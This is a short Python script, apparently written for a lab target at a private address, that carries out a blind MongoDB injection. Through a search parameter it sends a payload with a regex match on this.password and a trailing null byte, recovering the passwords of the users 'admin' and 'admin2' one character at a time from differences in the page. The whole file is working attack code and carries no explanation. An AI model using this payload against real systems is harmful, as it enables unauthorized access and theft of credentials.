#!/usr/bin/env python3
import requests
import string
from bs4 import BeautifulSoup

users = ['admin', 'admin2']
charset = string.ascii_letters + string.digits

base_url = f'http://192.168.22.129/mongodb/example2/?search='

for user in users:
    found = ''
    stop = False
    while not stop:
        stop = True
        for char in charset:
            temp = found + char
            payload = f"{user}%27%20%26%26%20this.password.match(/^{temp}.*$/)\x00"
            url = f'{base_url}{payload}'
            r = requests.get(url, allow_redirects=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            table = str(soup.find_all("td"))
            if len(table) > 10:
                stop = False
                found = found + char
                print(user, found)
                break
